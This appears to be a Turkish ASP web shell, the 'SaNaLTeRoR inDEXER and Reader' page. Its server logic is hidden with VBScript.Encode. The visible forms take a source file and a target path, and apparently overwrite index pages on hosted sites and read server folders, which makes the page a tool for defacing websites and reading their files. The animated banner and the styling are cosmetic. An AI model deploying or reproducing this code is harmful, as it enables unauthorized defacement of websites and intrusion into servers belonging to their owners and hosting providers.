<%@ LANGUAGE = VBScript.Encode %>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<meta http-equiv="Content-Language" content="tr">
<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>
<%#@~^UgsAAA==^mVs,/DXV@#@&OEk'~J@!mnUD+D@*@!4M@*@!6G.:,l1YrWUx4YOw=&zShA klxCsD+.WM KDL,YmDoY{m4^lU3,:nO4WN{2WkY@*@!rUw!Y,YzwnxkE8:bOP7ls;'JEjz1)S:3"r]cr"MJrPkry'*c@*@!&WKD:@*E@#@&m\6xE@!1+	YnD@*@!6WUY,^W^W.x^k:n~kk"+{X@*?^MkaYP_l0Vx9l@!4M@*@!WKxY,^W^WD{A4kD+,/rynxy@*@!z1nxD+.@*@!Vk@*$!PjmMraY~g+kx+,r^;Y!Dhl,CCV0P..k^:k,#nXmP`x;Y;ssE~?.\DsCMlPU[6~bDhm3~j+,?+M\.Nm3rPz/2~BPw42PBPlk2aPTk(k~NGdHlslMUPb+.rbxk~G0Ehl0~bkU,XmyVsYM @!(D@*@!^k@*$!P?1.kaYV~$kMPK3~?rOXnP`.lsl[C	P}C4s+O/b"1+~	N6PzYm8k^k./bxr"c`PUPPGW/D~jkD+^+.k~umDrP*@!Vb@*j^MkwOr	PFE^smxs,V0PAm3DCPnl.3,Mnsm+0OkMR@!^r@*SD0x~ArsTk~29rxs+V~bxPF;^VCxsC,|sm\!yE	E,63!X;x!y  c@!4M@*@!1+xDn.@*@!k@*AzP\n4NrJ@#@&3!VsC	k:xE@!mnxDnM@*@!6W	YP1W^GD{Vr:Pdr.+'l@*|!VVmUhP~k^orVn.b@!8D@*@!0KxO~1WVG.{h4kDn,/r.+{ @*@!z1nxD+.@*@!0GUDP/b"+{F@*@!sr@*g+MNnx_~~E.lHCPzYC^mxy~r	Nn6b~Tk.bx,`bDl1Cx.Prx9+a~n+x9rPUkYUry9+,rs:Cs*DU)Gn0mEsOcl/2@!^k@*1.XnQP~EPn/sCP	Nn6bPuC	ok,jkD+X~)Ymmm3dlU",WUE	~XDrUbPXC"mmC3kU.P.	P=PRczc zmVrxbxdrD+/b mK:P@!C~tM+6'_W.U3@*@!6GxDP^G^WDxsb:n@*G)_b~wb\Sb,Ig3|,"Z@!Jl@*@!J0W	O@*@!Vk@*6VE,g,A;DCzmPG3!hl0PrdD+Nnr	k"PGGkXC	x,bN	PjnPI+.k	k~emyx,@!l,tDWxgKD	+V @*@!6WUY,^W^W.x^k:n@*Gbub,oz}JzP"12nR@!&l@*@!&0KxO@*@!4D@*@!mxY.@*AHP@!l~t.n6'hlbsYK)hCbV4Gh(@$4WDhmkscmK:gkE(%+1Yxk	NnaD@*tnt9k@!JC@*@!(D@*?2+^rmV~K4Cx0/~PKPCGsHfn:KU,~30WMW:mx,SP_kO4mXOCMP~GnVb0kVE@#@&mKwz'E@!1+UY.@*@!0GUDPmGsKDxVbhPdby'*@*Ksk6Pul03@!8M@*@!6GxDPmKsGD{h4kO+~dbyn'y@*@!JmnUD+D@*@!^k@*A!~Um.bwDPHt9rP:l.l6x[C	P5m"VsYDc@!sk@*f+.Vr~:lV:,)D0l[C^lDh~_WsXGnsWUvb9:k	#,SPA3GDK:CU,`sc6RqPl9hrxbP*PSPurD4CXDCDv?CUmVb.n	l~b9hbxr*PBPfVbWk3~`UlUC^bDUl,bNsrUk*PBPPE.C	/G0D~`:E.C	/WWOcKVPz[skUb#,~Pg+K~.PP:,b[CsPr^Cx^lDm~P+30Ds+. c@!sk@*$E,?^.bwY~)kVCP@!WKxO,mKVWM'^r:@*JWTPcVmXY*~@!J0W	O@*K!Ysl"R@!sb@*3L9nDbx~ezwY~$!xCP~n	ynMPUmDbwD~KsP$k^orsDk,JWTVEHG.P~k^orxr"R Rv$E,KCVsNlU~UmGD^nXP9xxPdlsnD,\nPAL[nMPSmh+MkP:h~A^obVnDr~dWLV!zWMVC.*@!Vr@*V\nx^r,ArMPUmDbwD~k	Pjl9+^n,?K,dmMkwDsnDbxbPFEssmxhl	"P	+.rMky E@#@&sk	V^+.{J@!m+	Y.@*@!0GxDP^G^WD{sks+Pkr"+{*@*fG/O~UkO+^nD@!4.@*@!0WUO,mGVK.{h4bYP/byx @*@!&mxOnM@*@!^r@*ShhcdCxmVD+.W. KDL@!^r@*ShA 6lY4nMWWh8cmGs@!^k@*ShS /mxCVmDnUmRmKh@!^k@*SAARDEMlU/GWDRO3@!sk@*hAAcYl4.b4CYc^K:@!^k@*hhSRbdVm:CtbyhnDRmKh@!^k@*SAAR4lMEUXC4Hl WML@!1+UOD@*@!WKxOP1G^W.{DNPkk.n'W@*Jbt2]~UK2d3I@!zmUO+M@*@!4.@*@!WKxOPkry'+@*@!Vk@*ASh /m8KYCT+ Y+m:cGDTPSPShA kl\kC3cmWs~SPShSRhkUr6 xOJ@#@&GLP'~];;+kOcp;DH?YMk	L@#@&kWPKon~{PJr~Y4+x@#@&^l^V,:CkU@#@&+s/r0,WLn,'PE!Kx[+ME,Y4x@#@&mmV^~mm/nF@#@&nsk+k6~WT+P{~EW0ErPOtnU@#@&^l^sP1ldny@#@&nsk+r0,GT+~{Prtl03bUNmJ~Y4+U@#@&ml^sP1l/f@#@&Vk+r0~GT+~',E3!VsC	k:E~Dtnx@#@&1ls^P1l/c@#@&+^/nk6PGLP',EmKwXr~Otx@#@&^lss,mC/X@#@&+sdk0~GT+~',E^kU0VDJ,Y4nx@#@&^l^V~^m/++@#@&V/rWPKoPxPEGMxn3r~Y4+U@#@&mlss,mC/{@#@&n^/k0,WTnP{PEWMxnVyJPD4+	@#@&1CsV,mm/n%@#@&x[PbW@#@&/;8,:lrUS40DAA==^#~@%>
<center>
<br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br>
<hr color=lime width=50%>
<SCRIPT LANGUAGE="JavaScript">
 <!-- 
function Start(page)
 {
 OpenWin = this.open(page, "CtrlWindow","toolbar=menubar=No,scrollbars=No,status=No,height=250,");
 }
 //-->
</SCRIPT>
<script language="JavaScript1.2">
var message="SaNaLTeRoR - nDexEr - Reader"
var typingbasecolor="red"
var typingtextcolor="lime"
var blinkspeed=598 
var fontface="arial,geneva,helvetica"
var fontsize="5"
var n=0
if (document.all){
document.write('<font face="'+fontface+'" size="'+fontsize+'" color="'+typingbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="typinglight">'+message.charAt(m)+'</span>')
document.write('</font>')
var tempref=document.all.typinglight
}
else
document.write(message)
function typing(){
if (n==0){
for (m=0;m<message.length;m++)
tempref[m].style.color=typingbasecolor
}
tempref[n].style.color=typingtextcolor
if (n<tempref.length-1)
n++
else{
n=0
clearInterval(blinking)
setTimeout("starttyping()",1500)
return
}
}
function starttyping(){
if (document.all)
blinking=setInterval("typing()",blinkspeed)
}
starttyping()
</script> 
<form action="?Gonder" method="post">
<center><table>
<td>Nerden :<td><input type="text" name="nerden" size=25 value=index.html></td>
<td><input type="submit" onclick="submit()" value="Veriyi Gnder"></td><tr>
<td>Nereye :<td><input type="text" name="nereye" size=25></td><td><input type="reset" onclick="reset" value="    Temizle    "></td><tr>
</form>
<form action="?oku" method="post">
<td><font color=pink>Oku :</font><td><input type="text" name="klasor" size=25 value=<%=#@~^LQAAAA==.;;/DR/D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type="submit" onclick="submit()" value="  Veriyi Oku   "></td><tr>
</form>
</table><br>
<a href="javascript:void(0);" onclick="javascript:Start ('?hakkinda');">
Script Hakknda </a> - <a href="javascript:void(0);" onclick="javascript:Start ('?kullanim');">Kullanm Bilgileri </a>- <a href="javascript:void(0);" onclick="javascript:Start ('?copy');">Copright</a> -<a href="javascript:void(0);" onclick="javascript:Start ('?linkler');"> Linkler</a>
<br><br><br>
<hr color=lime width=50%>
<%#@~^VA4AAA==n	N~kE(@#@&EO RO ORO ORR OO RO O@#@&d;4,mm/nF@#@&Kx~+M.WMP.nkE:n~	+aY@#@&	+.9+	P',D5E/OR6W.hvJx.NxJ*@#@&xDXnPx~M+5EdYc0G.s`JUnM+z+rb@#@&jY,EYbVk~',?nD7+. ;D+mO+}4L^O`rHU/RPGKVdJ*@#@&b0~nMDP@!@*,!~Y4n	P@#@&D/wKxknRSDrYPE@!1+xDnD@*Cb:)~),JL+.D [/^Db2YbWU'r@!z^n	YnD@*E@#@&n^/@#@&M+k2W	/nRSDrOPJ^n:bxk.~$lmD^J@#@&nU9Pr0@#@&EDksdcnDG^/dsK.sPUDX+BP	nD9+U@#@&DndaWxknRSDkDn~J@!mxO+.@*@!4.@*@!WWM:~C1YkGU{g~:O4W[{wK/Y@*@!bUw!Y~YHwnxkE4srY,\l^;n'rJz1)Pj)Is)Jr~/bynxWc@*@!&6W.:@*E@#@&@#@&+	NPkE(@#@&EORO ORR OO RO OO RRO@#@&kE8P^Ck++@#@&Gx,+..KDP.nkEh+,U6O@#@&0VlkWM~',Dn;!+dOc0WMh`r3VmdGDr#@#@&j+O~K4%C:Pn,'~jD\n.cZ.+mOr8N+1Y`rHb^DK/G0DRp\dCK:KJ*@#@&bW~P	WDPnD.~{PTPD4+	P@#@&M+/2G	/nRS.bYn,J@!m+	Y.@*_bPb,)~EL+DM N/mMr2YbW	[E@!^n	YnD@*E@#@&+U[,k0@#@&K4%C:PhR6a+	PJV2:E~,JE[0VCdKD[rE~,0l^dn@#@&W(LuKPKc?nx9@#@&0W[smDPx~k+.\.ctOsVAxmKNcW(LuK:n ]/wKU/K+XOb@#@&D/2WUdRADbO+,J@!WKxY~^KVGD{A4kOPkky'l@*@!1+UYD@*~ P.A]SAIP ~@!4M@*@!mnxOnM@*@!YaYmDnC,/Yzs'vhb[DtlO!uitkT4Y=&X!pB@*EL3W9slM[J@!&O+XYmDnl@*E@#@&.+k2W	/n SDkOn,J@!4M@*@!0GM:,lmDkKU'QPh+DtG[{wWkO@*@!kxa;OPDXa+x/;8skOP7CV!+xErb1)~UbeszErPdby'cW@*@!&0KDh@*r@#@&n	NPk;4@#@&B RRO O ORORR ORO RO @#@&d!4P^Ck+f@#@&./2Kxk+RSDbO+,JE[1\W'rJ@#@&.+kwW	dnRSDbYnPEELY;/LEJ@#@&nU9P/;8@#@&vO R OR O OO O RO ORO @#@&d!4P1C/c@#@&.n/aW	/nRA.bYnPrE[0Essmxkh'rJ@#@&MnkwG	/RhMkDnPrJ'Y!/'Er@#@&UN,/E(@#@&B O ORORR ORO RO ORR O@#@&d!4~mmd*@#@&D/wKxknRSDrYPEELmWaz[rJ@#@&.n/aW	/nRA.bYnPrE[DEd'rJ@#@&n	N~/!8@#@&v O OO O RO ORO ORR OO@#@&/!4P1Cd++@#@&Dn/2G	/nRS.kD+~Er[SrU0VnDLEr@#@&M+kwW	/ hMkO+,JE'DE/LEJ@#@&+	[~/!4@#@&vORR ORO RO ORR OORR O@#@&k;(P^m/G@#@&DdwKxd+ch.rD+Pr@!Vb@*V0~UmPnE.4CU	PjkDn/bxn~zY:CV,krx,8bD~bx9+6,tm"D^lzxc@!sr@*?Yc~k	N+Xn.Pmx9P.+C[D~?1.kaYrUbxPeC	xCPIV^+zbxc@!Vb@*UGxMl~k	Nna,Alksl1l3,drYX^+~lzU,/nD7nD9lU~kkYn~mVUPJ~wDnVDPbk	~h4dls4C~bN+ms@!^k@*Grz+^ksP)NCh	PjkDn/bPW.+tGdDFfRSn(/Cs4mRmK:Jhl4:;Y,/r"9+PSn4kl:(C[l	P6Dn+4GkYq&cA+(/Ch(lR^Gszhl4d!x~9kH+4bD,z+MPCV9x"~7lDkCXmV:@!sr@*UY,kUNnaD~l	[PM+C[DPd^Mk2YbUbPWM+tWkY8fRS+8/m:8CcmWs&:mt/!U&k	N6nD Ckw~ob8k,XVsNkUr.R@!Vb@*_l"MVmNx.PbUN6rNPCz	PX.+,lYDU"R@!Vb@*r:[r,MnV9rPnE.8mxl~r	Nn6b~mYhmXmP/DPbUN6nD,lU[,D+m[+MP/1.rwDk	NnP@!WKxOP1GVKDx2bx3@*HD[+	@!J0G	Y@*PXmymUPH+.+,lOC1l:.~k	N+Xrhk.k	PCNU~Hl"XK.E.Rcr	N+a 4YhV,Lb4r*@!^k@*@!0KUY,mGVKDx2bx3@*H+M+X@!&0KxD@*~|dh	l~/~b9lhU,+8~nlslk.,4r.NxP(k.r:,3slkD[n	P4b~l^YP9r"k	NPGV[;!Prk	~RczhC4:EO&bx[+X 4Yh,XmyXKD!"P(E.Nm3r~bxNaR4Y:,C[lsx,/rYndbx[+0rPbx[nXB+~LM+~NrbD~s+k+VmP9n0mEsYcld2,0k^Cx9lPKsC4bVbD @!sr@*.nDbzk,MU[DPP;!xCP~CkYh.NmPb9ls~x9+ak,XnhbPr^;XKDR@!sr@*~E,ks+h[P@!0KUY,mGsKD'2r	3@*r0;@!zWKxD@*P0/s~AKPFl^l^C0R@!^r@*zDY0~ul^l,bUVChmNz/mUy,)~hmkV8Gs4@$tKOslr^R1W:,~,4W^X[+sWU@$4WYsCk^RmKh~~,hSh /CUmVO+MGDcW.L,/kOnsk"NU,\n,/bY+,l9hk	P&PsW[smDx9Cx,XlM[hPmVm4rVr.kkUk. Pr@#@&./wGUk+ hMrD+~rJLYEk[rE@#@&+UN,/;8@#@&B RO OO RRO O ORORR OR@#@&dE(P^Ck+%@#@&M+dwKUk+ SDbY+,J@!8D@*@!8D@*@!^n	Y+M@*A!P/1.rwDPt+4Nr~:l.l6UNmx~jcKP)[	l~5m"^:OMR@!4D@*mMnY^k~.P^.Y/b"Pz/w,uG/DVmDUPPh	NnPmsDcR@!8M@*b[./~?mOMPFk:	lPnW9;x!P!D	Ysns+3,dYNkbUry,fK/zlUU,b[x,zl.x  @!4D@*P6OlMnmP$^:,2+MP~G/mPulDl~#mDPGn:3Yb. @!(D@*|;D8C	x~fKdXmVC.	PM.UDVnX8bVh3,kx,bHUPU+.\D[n,rVsCx.PSm"hP_N9Pol.VYh+. R,@!8.@*bN.nkPF/sUmPPm:,.+Mk,!kMkskMPc.	)P9l-S+4'Csk1l	-[+WC!VORmdw@!4.@*@!Vk@*HVnD,emwC(k^kDb:@!8D@*?rYNnVbPk	^V!N+^n.k,Ym3rw~n9+.+0~b9:rU,nlUn^kU+,i^lhm@!(D@*zNsrx,kWD/rUbPl^hl@!4D@*jn/kkKx~.n~;WG3bnPG+n.^+Dr~mVCDmV,SGTk	Pr^:m@!4M@*jkD+snMkx,#+MkP:C8l	VmDUPU[bDh+,-/cR E@#@&DndaWU/ SDrD+,JJLY!d[rJ@#@&x[~kE4@#@&B OO RRO O ORORR ORO R@#@&WVIEAA==^#~@%>
</table>
<%#@~^CQAAAA==d!4~kYHV+mwMAAA==^#~@%>
<style>body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}.k1{font-family:Wingdings; font-size:15px;}.k2{font-family:Webdings; font-size:15px;}td{font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;}a{color:#EEEEEE;text-decoration:none;}a:hover{color:#40a0ec;}a:visited{color:#EEEEEE;}a:visited:hover{color:#40a0ec;}input,.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}textarea{background:#121212;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}</style>
<%#@~^BwAAAA==n	N~kE(oQIAAA==^#~@%>
